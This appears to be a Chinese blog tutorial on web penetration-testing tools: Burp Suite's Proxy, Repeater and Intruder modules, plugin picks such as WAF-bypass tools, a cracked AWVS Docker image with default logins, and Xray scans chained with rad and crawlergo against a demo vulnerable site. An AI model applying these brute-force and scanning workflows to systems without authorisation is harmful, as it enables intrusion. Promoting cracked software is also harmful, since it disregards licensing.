<p><img src="https://i.loli.net/2021/10/05/ayvRBstEuYQx8oq.png" alt="img"></p>
<h4 id="服务器返回消息修改"><a href="#服务器返回消息修改" class="headerlink" title="服务器返回消息修改"></a>服务器返回消息修改</h4><p><img src="https://i.loli.net/2021/10/05/ygtSWZnpjc8JAX1.png" alt="image.png"></p>
<p>自上而下，每一个选择项分别对应的功能是</p>
<ul>
<li>显示form表单中隐藏字段</li>
<li>高亮显示form表单中隐藏字段</li>
<li>使form表单中的disable字段生效，变成可输入域</li>
<li>移除输入域长度限制</li>
<li>移动JavaScript验证</li>
<li>移动所有的JavaScript</li>
<li>移除标签</li>
<li>转换https超链接为http链接</li>
<li>移除所有cookie中的安全标志</li>
</ul>
<p>通过服务器返回消息修改可选择项的设置，可以方便渗透测试人员在安全评估过程中突破原有的数据限制，更好、更快地检测服务器端的安全性，但实际上用到的不多。</p>
<h4 id="匹配替换"><a href="#匹配替换" class="headerlink" title="匹配替换"></a>匹配替换</h4><p>此项配置主要用来自动替换请求消息和服务器端返回消息中的某些值和文本，它与前文的规则的不同之处还在于支持正则表达式语言。</p>
<p><img src="https://i.loli.net/2021/10/05/nsrzJ6l7EXmgDyF.png" alt="img"></p>
<p>针对的是所有请求包，可以把特定字符替换成其他的字符。</p>
<p>当点击【Add】按钮时，在弹出的匹配或替换规则输入对话框中我们可以看到，它可以对请求和返回消息的消息头，消息体、请求参数名、请求参数值、请求的第一行进行匹配和替换。例如，当我们要替换所有返回消息中的邮箱地址为t0data@burpsuite.com时，可以参考下图的设置填写输入项并保存验证。</p>
<p><img src="https://i.loli.net/2021/10/05/GxIFETiBWMAU4yv.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/bsuBRLTwGeNMKAo.png" alt="img"></p>
<p>支持正则表达式匹配！！！</p>
<h4 id="其他配置项"><a href="#其他配置项" class="headerlink" title="其他配置项"></a>其他配置项</h4><p>其他配置项主要是杂项设置。其界面如下：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/02fd2597299af5a0787e371178c9a732.png" alt="img"></p>
<p>自上而下依次的功能是</p>
<ul>
<li><p>指定使用HTTP/1.0协议与服务器进行通信 这项设置用于强制客户端采用HTTP/1.0协议与服务器进行通信，一般客户端使用的HTTP协议版本依赖于客户端浏览器，但某些服务器或者应用，必须使用HTTP/1.0协议，此时可勾选此项</p>
</li>
<li><p>指定使用HTTP/1.0协议反馈消息给客户端 目前所有的浏览器均支持HTTP/1.0协议和HTTP/1.1协议，强制指定HTTP/1.0协议主要用于显示浏览器的某些方面的特征，比如，阻止HTTP管道攻击。</p>
</li>
<li><p>设置返回消息头中的“Connection：close” 可用于某些情况下的阻止HTTP管道攻击。</p>
</li>
<li><p>请求消息头中脱掉Proxy-* 浏览器请求消息中，通常会携带代理服务器的相关信息，此选项主要用于清除消息头中的代理服务器信息。</p>
</li>
<li><p>解压请求消息中的压缩文件 某些应用在与服务器端进行交互时，会压缩消息体，勾选此选项，则Burp Suite 会自动解压消息体</p>
</li>
<li><p>解压返回消息中的压缩文件 大多数浏览器支持压缩的消息体，勾选此选项，则Burp Suite 会自动解压被服务器端压缩的消息体</p>
</li>
<li><p>禁用<a href="http://burp">http://burp</a></p>
</li>
<li><p>允许通过DNS和主机名访问web接口 即允许通过域名或主机名访问Burp Suite</p>
</li>
<li><p>不在浏览器中显示Burp Suite错误 在我们使用Burp Suite时，如果发生了Burp Suite自身的错误，会在浏览器中显示，如果勾选了此项，则不会在浏览器中显示此类错误。</p>
</li>
<li><p>禁用日志到历史和网站地图中 此选项的作用是阻止记录日志到历史和网站地图，在某些情况下可能有用，比如说，通过上游服务器进行认证或者做正则表达式替换时，为了降低内存的消耗，减少日志的储存，你可以勾选此项。</p>
</li>
<li><p>拦截功能开始设置 这个选项主要用来配置intercept功能的生效方式，分为总是生效、 总是失效 、从上一次的Burp Suite中恢复设置3种方式。</p>
</li>
</ul>
<h4 id="历史记录History"><a href="#历史记录History" class="headerlink" title="历史记录History"></a>历史记录History</h4><p>Burp Proxy的历史记录由HTTP历史和WebSockets历史两个部分组成。</p>
<p>HTTP历史界面由筛选过滤器、历史记录列表、消息详情3个部分组成。</p>
<p><img src="https://i.loli.net/2021/10/05/JAlzktEWv4hXyxK.png" alt="img"></p>
<p>当我们在做产品系统的安全评估过程中，会在HTTP历史中保存了大量的日志记录，为了更友好的消息管理，Burp提供了筛选过滤器功能。当我们点击HTTP历史标签下发的Filter时，将弹出筛选过滤器界面。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/369f18129e2b54f61f7a672c8e767883.png" alt="img"></p>
<ul>
<li><p>按照过滤条件的不同，筛选过滤器划分出7个子板块，分别是</p>
</li>
<li><p>按照请求类型过滤 你可以选择仅显示当前作用域的、仅显示有服务器端响应的和仅显示带有请求参数的消息。当你勾选“仅显示当前作用域”时，此作用域需要在Burp Target的Scope选项中进行配置，详细请阅读Burp Target相关章节。</p>
</li>
<li><p>按照MIME类型过滤 你可以控制是否显示服务器端返回的不同的文件类型的消息，比如只显示HTML、css或者图片。此过滤器目前支持HTML、Script、XML、CSS、其他文本、图片、Flash、二进制文件 8种形式。</p>
</li>
<li><p>按照服务器返回的HTTP状态码过滤 Burp根据服务器的状态码，按照2XX,3XX,4XX,5XX分别进行过滤。比如，如果你只想显示返回状态码为200的请求成功消息，则勾选2XX。</p>
</li>
<li><p>按照查找条件过滤 此过滤器是针对服务器端返回的消息内容，与输入的关键字进行匹配，具体的匹配方式，你可以选择 1.正则表达式 2.大小写敏感 3.否定查找 3种方式的任何组合，前面两种匹配方式容易理解，第3种匹配方式是指与关键字匹配上的将不再显示。</p>
</li>
<li><p>按照文件类型过滤 通过文件类型在过滤消息列表，这里有两个选择可供操作。一是仅仅显示哪些，另一个是不显示哪些。如果是仅仅显示哪些，在show only的输入框中填写显示的文件类型，同样，如果不显示哪些文件类型，只要在hide的输入框中填写不需要显示的文件类型即可。</p>
</li>
<li><p>按照注解过滤 此过滤器的功能是指，根据每一个消息拦截时候的备注或者是否高亮来作为筛选条件控制哪些消息在历史列表中显示。</p>
</li>
<li><p>按照监听端口过滤 此过滤器通常使用于当我们在Proxy Listeners中多个监听端口时，仅仅显示某个监听端口通信的消息，一般情况下，我们很少用到。</p>
</li>
</ul>
<p>现在，我们再看看WebSockets历史选项的功能，从界面上我们可以看出，WebSockets历史所提供的功能和选项是HTTP历史的一个子集，只是因为采用的通信方式的不同，而被独立出来成为一个专门的视图。其功能的使用方式与HTTP历史雷同，此处就不在赘述。</p>
<h3 id="Target模块"><a href="#Target模块" class="headerlink" title="Target模块"></a>Target模块</h3><p>Burp Target 组件主要包含站点地图、目标域、Target 工具三部分组成，他们帮助渗透测试人员更好地了解目标应用的整体状况、当前的工作涉及哪些目标域、分析可能存在的攻击面等信息，下面我们就分别来看看Burp Target的三个组成部分。</p>
<h4 id="目标域设置-Target-Scope"><a href="#目标域设置-Target-Scope" class="headerlink" title="目标域设置 Target Scope"></a>目标域设置 Target Scope</h4><p>Target Scope中作用域的定义比较宽泛，通常来说，当我们对某个产品进行渗透测试时，可以通过域名或者主机名去限制拦截内容，这里域名或主机名就是我们说的作用域；如果我们想限制得更为细粒度化，比如，你只想拦截login目录下的所有请求，这时我们也可以在此设置，此时，作用域就是目录。总体来说，Target Scope主要使用于下面几种场景中：</p>
<ul>
<li>限制站点地图和Proxy 历史中的显示结果</li>
<li>告诉Burp Proxy 拦截哪些请求</li>
<li>Burp Spider抓取哪些内容</li>
<li>Burp Scanner自动扫描哪些作用域的安全漏洞</li>
<li>在Burp Intruder和Burp Repeater 中指定URL</li>
</ul>
<p>通过Target Scope 我们能方便地控制Burp 的拦截范围、操作对象，减少无效的噪音。在Target Scope的设置中，主要包含两部分功能：允许规则和去除规则。</p>
<p><img src="https://i.loli.net/2021/10/05/O6heAwENfSgBptF.png" alt="img"></p>
<p>其中允许规则顾名思义，即包含在此规则列表中的，视为操作允许、有效。如果此规则用于拦截，则请求消息匹配包含规则列表中的将会被拦截；反之，请求消息匹配去除列表中的将不会被拦截。</p>
<p><img src="https://i.loli.net/2021/10/05/w49agqpOvFi81nG.png" alt="img"></p>
<p>如果想要设置其他的协议或端口等设置，可点</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/700c8ead11de0be4aced10dd88bf9ef8.png" alt="img"></p>
<p>当我们设置了Target Scope （默认全部为允许），使用Burp Proxy进行代理拦截，在渗透测试中通过浏览器代理浏览应用时，Burp会自动将浏览信息记录下来，包含每一个请求和应答的详细信息，保存在Target站点地图中。</p>
<h4 id="站点地图-Site-Map"><a href="#站点地图-Site-Map" class="headerlink" title="站点地图 Site Map"></a>站点地图 Site Map</h4><p>下图所示站点地图为一次渗透测试中，通过浏览器浏览的历史记录在站点地图中的展现结果。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/f0dd2f82e923e0aa1b849c51ca992287.png" alt="img"></p>
<p>从图中我们可以看出，Site Map的左边为访问的URL，按照网站的层级和深度，树形展示整个应用系统的结构和关联其他域的url情况；右边显示的是某一个url被访问的明细列表，共访问哪些url，请求和应答内容分别是什么，都有着详实的记录。 基于左边的树形结构，我们可以选择某个分支，对指定的路径进行扫描和抓取。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b7a42a1c433e3171e6d321ce28047891.png" alt="img"></p>
<h3 id="Repeater模块"><a href="#Repeater模块" class="headerlink" title="Repeater模块"></a>Repeater模块</h3><p>Burp Repeater作为Burp Suite中一款手工验证HTTP消息的测试工具，通常用于多次重放请求响应和手工修改请求消息的修改后对服务器端响应的消息分析。</p>
<h4 id="Repeater的使用"><a href="#Repeater的使用" class="headerlink" title="Repeater的使用"></a>Repeater的使用</h4><p>在渗透测试过程中，我们经常使用Repeater来进行请求与响应的消息验证分析，比如修改请求参数，验证输入的漏洞；修改请求参数，验证逻辑越权；从拦截历史记录中，捕获特征性的请求消息进行请求重放。Burp Repeater的操作界面如下图所示：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bf5e6c9c3a7638df3b8d016d7c23cede.png" alt="img"></p>
<p>请求消息区为客户端发送的请求消息的详细信息，Burp Repeater为每一个请求都做了请求编号，当我们在请求编码的数字上双击之后，可以修改请求的名字，这是为了方便多个请求消息时，做备注或区分用的。在编号的下方，有一个【Send】按钮，当我们对请求的消息编辑完之后，点击此按钮即发送请求给服务器端。服务器的请求域可以在target处进行修改，如上图所示。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/05e87a80abd3e5e3f677b085aab3b1a8.png" alt="img"></p>
<p>应答消息区为对应的请求消息点击【Send】按钮后，服务器端的反馈消息。通过修改请求消息的参数来比对分析每次应答消息之间的差异，能更好的帮助我们分析系统可能存在的漏洞。</p>
<p>在我们使用Burp Repeater时，通常会结合Burp的其他工具一起使用，比如Proxy的历史记录，Scanner的扫描记录、Target的站点地图等，通过其他工具上的右击菜单，执行【Send to Repeater】，跳转到Repeater选项卡中，然后才是对请求消息的修改以及请求重放、数据分析与漏洞验证。</p>
<h3 id="Intruder模块"><a href="#Intruder模块" class="headerlink" title="Intruder模块"></a>Intruder模块</h3><p>Burp Intruder作为BurpSuite中一款功能极其强大的自动化测试工具，通常被系统安全渗透测试人员被使用在各种任务测试的场景中。</p>
<h4 id="Intruder使用场景和操作步骤"><a href="#Intruder使用场景和操作步骤" class="headerlink" title="Intruder使用场景和操作步骤"></a>Intruder使用场景和操作步骤</h4><p>在渗透测试过程中，我们经常使用Burp Intruder，它的工作原理是：Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload),在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。Burp Intruder通常被使用在以下场景：</p>
<ul>
<li>标识符枚举 Web应用程序经常使用标识符来引用用户、账户、资产等数据信息。例如，用户名，文件ID和账户号码。</li>
<li>提取有用的数据 在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符提取一些其他的数据。比如说，你想通过用户的个人空间id，获取所有用户在个人空间标准的昵称和年龄。</li>
<li>模糊测试 很多输入型的漏洞，如SQL注入，跨站点脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场景，您可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。</li>
</ul>
<p>通常来说，使用Burp Intruder进行测试，主要遵循以下步骤：</p>
<ol>
<li>确认Burp Suite安装正确并正常启动，且完成了浏览器的代理设置。</li>
<li>进入Burp Proxy选项卡，关闭代理拦截功能。</li>
<li>进行历史日志（History）子选项卡，查找可能存在问题的请求日志，并通过右击菜单，发送到Intruder。</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/dnKRwxF731cL6GH.png" alt="img"></p>
<ol>
<li>进行Intruder 选项卡，打开Target和Positions子选项卡。这时，你会看到上一步发送过来的请求消息。</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/xrgs8Y7wjEbpVOe.png" alt="image.png"></p>
<ol>
<li><p>因为我们了解到Burp Intruder攻击的基础是围绕刚刚发送过来的原始请求信息，在原始信息指定的位置上设置一定数量的攻击载荷Payload，通过Payload来发送请求获取应答消息。默认情况下，Burp Intruder会对请求参数和Cookie参数设置成Payload position，前缀添加§符号 ， 如上图红色标注位置所示。 当发送请求时，会将标识的参数替换为Payload。</p>
<blockquote>
<p>Attack type选项：</p>
<ul>
<li>Sinper（狙击手）：对变量依次进行破解。多个标记依次进行。适合爆破已知用户名但密码未知的情况。</li>
<li>Battering ram（攻城锤）：对变量同时进行破解，多个目标同时进行。适合爆破用户名与密码一致的情况。</li>
<li>PitchFork（鱼叉）：每一个变量标记对应一个字典，取每个字典的对应项。适合使用代理IP池的情况。</li>
<li>Cluster boom（集束炸弹）：每一个变量对应一个字典，并且进行交叉破解，尝试各种组合。适用于爆破用户名+密码的情况。</li>
</ul>
</blockquote>
</li>
<li><p>在Position界面的右边，有【Add §】、【Clear §】、【Auto §】、【Refersh §】四个按钮，是用来控制请求消息中的参数在发送过程中是否被Payload替换，如果不想被替换，则选择此参数，点击【Clear】，即将参数前缀去掉。</p>
</li>
<li><p>当我们打开Payload 子选项卡，选择Payload的生成或者选择策略，默认情况下选择“Simple list”,当然你也可以通过下拉选择其他Payload类型或者手工添加。</p>
</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/RiXrHIKV8Y1eWZg.png" alt="img"></p>
<ol>
<li>此时，我们再回到Position界面，在界面的右上角，点击【Start attack】，发起攻击。</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/2fiz5RmjpCMvYud.png" alt="img"></p>
<ol>
<li>此时，Burp会自动打开一个新的界面，包含攻击执行的情况、Http状态码、长度等结果信息。</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c41e7fc3d318133f2019f7349c32edea.png" alt="img"></p>
<ol>
<li>我们可以选择其中的某一次通信信息，查看请求消息和应答消息的详细。</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7482b496dc9fb8e3846f30e11102d768.png" alt="img"></p>
<h3 id="Project-Options模块"><a href="#Project-Options模块" class="headerlink" title="Project Options模块"></a>Project Options模块</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/e2eee982f969e3f3364cfaa3d4cee97d.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/wIZYEzoNHv78eSu.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/qUhzYO97pkLtN6b.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/Q6bmxjfg1WICG9h.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/QUT18RhKVny3SIN.png" alt="img"></p>
<h3 id="User-Options模块"><a href="#User-Options模块" class="headerlink" title="User Options模块"></a>User Options模块</h3><p><img src="https://i.loli.net/2021/10/05/e1zu8X297QrB4HV.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/VEm3TBsjqQHdrAR.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/GV4zwEtxo7sMYem.png" alt="img"></p>
<h3 id="BurpSuite扩展插件推荐"><a href="#BurpSuite扩展插件推荐" class="headerlink" title="BurpSuite扩展插件推荐"></a>BurpSuite扩展插件推荐</h3><ul>
<li>Autorize —— 强大的越权自动化测试工具</li>
<li>Turbo Intruder —— 短时间发送大量请求</li>
<li>Software Vulnerability Scanner —— 自动根据版本号查找 CVE</li>
<li>Scan Check Builder —— 自定义扫描 payload</li>
<li>BypassWAF —— 可帮助绕过WAF</li>
<li>Logger++ —— 更强大的请求历史查看器</li>
<li>Brida —— 连接 frida 与 burpsuite</li>
<li>J2EEScan —— 强大的 J2EE 后台扫描插件</li>
<li>sqlmap4burp++ —— 连接 burpsuite 与 sqlmap</li>
<li>Knife —— 工具箱、自定义 payload</li>
<li>CSRF Token Tracker —— 绕过CSRF限制进行暴力破解</li>
<li>JSON Beautifier —— 格式化查看 json</li>
<li>Decompressor —— 自动解码和修改 gzip 压缩包</li>
<li>Wsdler —— 测试 WSDL 请求</li>
</ul>
<h2 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h2><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。</p>
<blockquote>
<p>这里推荐使用的AWVS虽然不是最新版，但是是最新的破解docker版</p>
</blockquote>
<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>1、docker中拉取下载镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull secfa/docker-awvs</span><br></pre></td></tr></table></figure>
<p>2、将docker的3443端口映射到物理机的 3443端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br></pre></td></tr></table></figure>
<p>3、<code>https://docker所在服务器的ip:3343</code></p>
<p>默认用户名和密码：</p>
<p><code>username: admin@admin.com</code></p>
<p><code>password: Admin123</code></p>
<p><img src="https://i.loli.net/2021/10/05/bt1anT2DRJ3xmkS.png" alt="227b2f2bf566fb26bf9afe9c31447e2d.png"></p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p><strong>使用界面</strong></p>
<p><img src="https://i.loli.net/2021/10/05/bAkiWhe6Xl2GDFH.png" alt="在这里插入图片描述"></p>
<p><strong>扫描功能区</strong></p>
<p><img src="https://i.loli.net/2021/10/05/IMhU4JFtCyXLZSk.png" alt="在这里插入图片描述"></p>
<ol>
<li>Targets 点击 targets返回目标列表，选择要扫描的url，点击scan开始扫描</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/zZLSaFfmjDVEx3p.png" alt="在这里插入图片描述"></p>
<ol>
<li>Vulnerabilities 点击Vulnerabilities查看漏洞列表，选择具体的漏洞可以进行右上方的操作</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/yCExQjGKFYBXeUw.png" alt="在这里插入图片描述"></p>
<ol>
<li><p>Reports 点击reports，可以看到扫描结束的报告列表，可以导出为pdf和html格式的</p>
<p><img src="https://i.loli.net/2021/10/05/nC8DyOGFXZTBI14.png" alt="在这里插入图片描述"></p>
</li>
</ol>
<p><strong>设置区</strong></p>
<ol>
<li>Users(用户管理) 创建子用户</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/FejScwlBL1YIz8C.png" alt="在这里插入图片描述"></p>
<ol>
<li>ScanTypes(扫描类型) 添加自定义扫描类型</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/y3VofR62hLmI1cM.png" alt="在这里插入图片描述"></p>
<ol>
<li>Network Scanner(网络扫描器)</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/MnQtqTvDH6ELhGa.png" alt="在这里插入图片描述"></p>
<h2 id="AppScan"><a href="#AppScan" class="headerlink" title="AppScan"></a>AppScan</h2><p>IBM AppScan该产品是一个领先的 Web 应用安全测试工具，曾以 Watchfire AppScan 的名称享誉业界。Rational AppScan 可自动化 Web 应用的安全漏洞评估工作，能扫描和检测所有常见的 Web 应用安全漏洞。</p>
<p>AppScan的下载、安装可参考：<a href="https://www.jb51.net/softs/733458.html">https://www.jb51.net/softs/733458.html</a></p>
<p>个人认为扫描速度比AWVS要慢很多，这里不做过多讲解。</p>
<h2 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>项目地址：<a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></p>
<p>长亭科技研发的一款完善的安全评估工具，支持常见 Web 安全问题扫描和自定义 POC，虽然 Github 有项目，但是不开源，只提供社区版本供大家使用。</p>
<ul>
<li>有关Xray的配置可以参考此文章：<a href="https://www.sqlsec.com/2020/04/xray.html#toc-heading-21">https://www.sqlsec.com/2020/04/xray.html#toc-heading-21</a></li>
<li>Xray安全工具评估文档：<a href="https://docs.xray.cool/#/tutorial/introduce">https://docs.xray.cool/#/tutorial/introduce</a></li>
</ul>
<p>这里只是进行一个简单使用。</p>
<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><h4 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h4><p>代理模式下的基本架构为，扫描器作为中间人，首先原样转发流量，并返回服务器响应给浏览器等客户端，通讯两端都认为自己直接与对方对话，同时记录该流量，然后修改参数并重新发送请求进行扫描。这种原理和 Burpsuite 的自带的漏扫原理是一样的。</p>
<h4 id="生成-ca-证书"><a href="#生成-ca-证书" class="headerlink" title="生成 ca 证书"></a>生成 ca 证书</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  生成 ca 证书</span></span><br><span class="line">./xray genca</span><br><span class="line"></span><br><span class="line"><span class="comment">#  在当前文件夹生成 ca.crt 和 ca.key 两个文件</span></span><br><span class="line">ls</span><br><span class="line">ca.crt      ca.key      config.yaml xray</span><br></pre></td></tr></table></figure>
<p>将生成的 ca 证书导入到需要代理的设备即可，这样就可以方便代理 https 的流量了</p>
<h4 id="启用代理"><a href="#启用代理" class="headerlink" title="启用代理"></a>启用代理</h4><p>第一次启动 xray 之后，当前目录会生成 <code>config.yml</code> 配置文件。</p>
<p>监听本地的<code>7777</code>端口，并设置漏洞报告的输出的文件名为：<code>xray-testphp.html</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./xray webscan --listen 127.0.0.1:7777 --html-output xray-testphp.html</span><br></pre></td></tr></table></figure>
<h4 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h4><p>Chrome 下的 SwitchyOmega 插件很方便添加各种代理，将xray的代理添加进来，然后浏览器开启 xray 代理即可:</p>
<p><img src="https://image.3001.net/images/20200415/15869142439356.png" alt="img"></p>
<h4 id="开始扫描"><a href="#开始扫描" class="headerlink" title="开始扫描"></a>开始扫描</h4><p>使用刚刚设置过代理的 Chrome 浏览器访问：<a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com</a></p>
<p>然后就可以看到 xray 界面开始输出漏洞信息，在用户和网站交互的时候，期间的连接 xray 都会进行安全检查，然后生成对应的漏洞报告:</p>
<p>下面是几个快速链接，可以点击用于体验更多的漏洞类型的扫描</p>
<ul>
<li><a href="http://testphp.vulnweb.com/listproducts.php?cat=1">http://testphp.vulnweb.com/listproducts.php?cat=1</a></li>
<li><a href="http://testphp.vulnweb.com/artists.php?artist=2">http://testphp.vulnweb.com/artists.php?artist=2</a></li>
<li><a href="http://testphp.vulnweb.com/redir.php?r=http://www.w3.org">http://testphp.vulnweb.com/redir.php?r=http://www.w3.org</a></li>
</ul>
<p>可以在上面设置的输出格式里面看到对应的漏洞检测结果报告：</p>
<p><img src="https://image.3001.net/images/20200415/15869147021320.png" alt="img"></p>
<h3 id="爬虫模式"><a href="#爬虫模式" class="headerlink" title="爬虫模式"></a>爬虫模式</h3><p>爬虫模式是模拟人工去点击网页的链接，然后去分析扫描，和代理模式不同的是，爬虫不需要人工的介入，访问速度要快很多，但是也有一些缺点需要注意。</p>
<ul>
<li>xray 的基础爬虫不能处理 js 渲染的页面</li>
<li>需要首先人工配置登录 cookie，必需的 http 头等，如果登录失败，也不容易发现问题</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xray webscan --basic-crawler http://testphp.vulnweb.com/ --html-output xray-crawler-testphp.html</span><br></pre></td></tr></table></figure>
<p>在这个模式下，相当于主动扫描模式，自主分析页面的链接，然后自动探测是否有漏洞。</p>
<h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h3><p>xray 也支持服务扫描，目前的服务扫描的POC还不够多，目前只有一个 tomcat-cve-2020-1938 ajp 协议任意文件检测poc。</p>
<p>参数配置目前比较简单，支持单个扫描与批量扫描：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 快速检测单个目标</span></span><br><span class="line">./xray servicescan --target 127.0.0.1:8009</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量检查的 1.file 中的目标, 一行一个目标，带端口</span></span><br><span class="line">./xray servicescan --target-file test.file</span><br></pre></td></tr></table></figure>
<p>其中 <code>test.file</code> 的格式为一个行一个 service，如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.3.0.203:8009</span><br><span class="line">127.0.0.1:8009</span><br></pre></td></tr></table></figure>
<p>也可以将结果输出到报告中，支持多种格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将检测结果输出到 html 报告中</span></span><br><span class="line">./xray servicescan --target 127.0.0.1:8009 --html-output service.html</span><br><span class="line">./xray servicescan --target-file test.file --html-output service.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将检测结果输出到 json 文件中</span></span><br><span class="line">./xray servicescan --target 127.0.0.1:8099 --json-output service.json </span><br></pre></td></tr></table></figure>
<p>完整的servicescan用法可以使用下面命令查看：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./xray servicescan --help</span><br><span class="line">NAME:</span><br><span class="line">    servicescan - Run a service scan task</span><br><span class="line"></span><br><span class="line">USAGE:</span><br><span class="line">    servicescan [command options] [arguments...]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">   --target value          specify the target, for example: host:8009</span><br><span class="line">   --target-file value     load targets from a local file, one target a line</span><br><span class="line">   --json-output FILE      output xray results to FILE in json format</span><br><span class="line">   --webhook-output value  post xray result to url in json format</span><br><span class="line">   --html-output FILE      output xray result to FILE in HTML format</span><br></pre></td></tr></table></figure>
<h3 id="Xray与Rad联动"><a href="#Xray与Rad联动" class="headerlink" title="Xray与Rad联动"></a>Xray与Rad联动</h3><p>长亭科技研发的一款浏览器爬虫，rad 爬虫可以动态渲染各种框架的网站并进行请求抓取。</p>
<p>可以配合Rad实现强大的主动扫描。</p>
<p>rad下载地址：<a href="https://github.com/chaitin/rad">https://github.com/chaitin/rad</a></p>
<p>与xray联动方式</p>
<ul>
<li><p>社区版：设置上级代理为xray监听地址 运行xray：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure>
<p>  运行rad：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rad -t http://example.com -http-proxy 127.0.0.1:7777</span><br></pre></td></tr></table></figure>
</li>
<li><p>高级版对 rad 进行了深度融合，下载后可以一键使用：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray webscan --browser-crawler http://example.com --html-output vuln.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Xray与Crawlergo联动"><a href="#Xray与Crawlergo联动" class="headerlink" title="Xray与Crawlergo联动"></a>Xray与Crawlergo联动</h3><p><strong>crawlergo</strong>是一个使用<code>chrome headless</code>模式进行URL收集的浏览器爬虫。它对整个网页的关键位置与DOM渲染阶段进行HOOK，自动进行表单填充并提交，配合智能的JS事件触发，尽可能的收集网站暴露出的入口。内置URL去重模块，过滤掉了大量伪静态URL，对于大型网站仍保持较快的解析与抓取速度，最后得到高质量的请求结果集合。</p>
<p>crawlergo下载地址：<a href="https://github.com/Qianlitp/crawlergo">https://github.com/Qianlitp/crawlergo</a></p>
<p><strong>crawlergo_x_XRAY</strong>：360 0Kee-Team 的 crawlergo动态爬虫 结合 长亭XRAY扫描器的被动扫描功能 (其它被动扫描器同理)</p>
<p>项目地址：<a href="https://github.com/timwhitez/crawlergo_x_XRAY">https://github.com/timwhitez/crawlergo_x_XRAY</a></p>
<p>与Xray联动方式</p>
<p>1、下载xray最新的release, 下载crawlergo最新的release</p>
<p>注意,是下载编译好的文件而不是git clone它的库</p>
<p>2、下载crawlergo_x_XRAY</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/timwhitez/crawlergo_x_XRAY.git</span><br></pre></td></tr></table></figure>
<p>3、把launcher.py和targets.txt放在crawlergo.exe同目录下</p>
<p>4、配置好并启动xray被动扫描(脚本默认配置为127.0.0.1:7777)若修改端口请同时修改launcher.py文件中的proxies</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure>
<p>5、配置好launcher.py的cmd变量中的crawlergo爬虫配置(主要是chrome路径改为本地路径), 默认为：</p>
<p><code>./crawlergo -c C:\Program Files (x86)\Google\Chrome\Application\chrome.exe -t 20 -f smart --fuzz-path --output-mode json target</code></p>
